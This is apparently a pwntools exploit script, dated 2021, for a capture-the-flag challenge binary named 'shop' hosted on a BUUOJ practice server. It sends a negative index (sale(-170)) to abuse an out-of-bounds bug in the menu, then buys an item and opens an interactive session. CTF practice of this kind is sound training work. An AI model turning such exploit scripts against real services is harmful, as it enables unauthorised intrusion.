# -*- encoding: utf-8 -*-
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './shop'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '27563'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def cmd(num):
    sla('>',num)

def sale(no):
    cmd(3)
    sla('Which one?',no)

def buy(no):
    cmd(2)
    sla('Which one?',no)

sale(-170)
p.recvuntil('Fair prices!')
p.sendlineafter('>','2')
p.sendlineafter('Which one?','1')
p.recvuntil('Thank you for your patronage~')
p.sendlineafter('>','1')
# dbg()


p.interactive()

'''
@File    :   shop.py
@Time    :   2021/08/23 12:03:38
@Author  :   Niyah 
'''